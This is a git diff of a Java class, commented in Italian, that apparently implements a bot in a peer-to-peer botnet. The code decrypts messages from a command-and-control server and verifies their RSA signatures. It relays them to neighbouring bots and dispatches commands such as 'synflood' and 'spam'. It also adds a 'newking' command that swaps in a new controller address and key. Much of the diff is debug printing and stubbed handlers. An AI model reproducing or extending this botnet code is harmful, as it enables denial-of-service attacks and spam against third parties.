@@ -157,17 +157,25 @@ public class Behavior {
 		String msg = "";
 
 		// decritta il msg
+		System.out.println("rawdata: "+rawData);
 			msg = pki.getCrypto().decryptAES(rawData);
+			System.out.println("msg: "+msg.toString());
 			if(msg == null)
 				return;
 		// Per comodità
-		String[] msgs = msg.split("|");
+		String[] msgs = msg.split("<HH>");
+		
+		for (int i = 0; i < msgs.length; i++) {
+			System.out.println("msgs["+i+"]= "+msgs[i]);
+		}
 		
 		// hai gia ricevuto questo msg? bella domanda
 		if (msgHashList.indexOfValue2(msgs[0]) < 0) {
+			System.out.println("idHashMessage "+msgs[0]);
 				System.out.println("NUOVO ORDINE DA ESEGUIRE");
 			// verifica la firma con chiave publica c&c
 			try {
+				System.out.println("signature"+msgs[2]);
 				if (pki.validateSignedMessageRSA(msgs[0], msgs[2],nServ.getCommandConquerIps().getList().get(0).getValue2())) {
 					Pairs<Integer, String> data = new Pairs<>();
 					data.setValue1(msgHashList.getSize() + 1);
@@ -178,7 +186,7 @@ public class Behavior {
 					floodNeighoours(msg);
 					System.out.println("FLOOD A VICINI");
 					// inoltra all'interpretedei msg
-					executeCommand(msg);
+					executeCommand(msgs[1]);
 					System.out.println("COMANDO ESEGUTO");
 				}else{
 					System.out.println("SIGNATURE COMANDO FALLITA");
@@ -193,9 +201,21 @@ public class Behavior {
 
 	@Async
 	private void floodNeighoours(String msg) {
-		nServ.getNeighbours().getList().forEach((pairs) -> {
-			req.sendFloodToOtherBot(pairs.getValue1().toString(), msg);
-		});
+		
+System.out.println("size lista "+ nServ.getNeighbours().getList().size());
+		for (Pairs<IP,PublicKey> p : nServ.getNeighbours().getList()) {
+			IP test=new IP(new String(p.getValue1().getIp().toString()));
+			System.out.println("test "+test);
+			System.out.println("pairs ip"+ p.getValue1().toString());
+			System.out.println("pairs ip"+ p.getValue1().getIp().toString());
+		
+//			req.sendFloodToOtherBot(p.getValue1(), msg);
+		}
+		
+//		nServ.getNeighbours().getList().forEach((pairs) -> {
+//			System.out.println("pairs ip"+pairs.getValue1().getIp());
+//			req.sendFloodToOtherBot(pairs.getValue1(), msg);
+//		});
 
 		// cripta il messaggio e invialo ai vicini
 
@@ -204,18 +224,20 @@ public class Behavior {
 	// TODO definire attacchi
 	@Async
 	private void executeCommand(String msg) {
-		switch (msg) {
-		case "synflood":
-			malS.synFlood(msg);
-			break;
-		case "spam":
-			malS.spam(msg);
-			break;
-		case "search file":
-
-			break;
+	
+		if(msg.startsWith("newking")){
+			foo(msg);
 		}
-
+		if(msg.startsWith("synflodd")){
+			
+		}
+		if(msg.startsWith("")){
+			
+		}
+		if(msg.startsWith("")){
+			
+		}
+		
 		// che comando è?
 		// spam
 		// attack
@@ -226,6 +248,14 @@ public class Behavior {
 
 	}
 
+	public void foo(String  msg){
+		String[] msgs = msg.split("<CC>");
+		nServ.getCommandConquerIps().getList().remove(0);
+		Pairs<IP,PublicKey> pairs=new Pairs<IP,PublicKey>(new IP(msgs[1]),pki.rebuildPuK(msgs[2]));
+		nServ.getCommandConquerIps().add(pairs);
+		
+	}
+	
 	public BotRequest getRequest() {
 		return req;
 	}
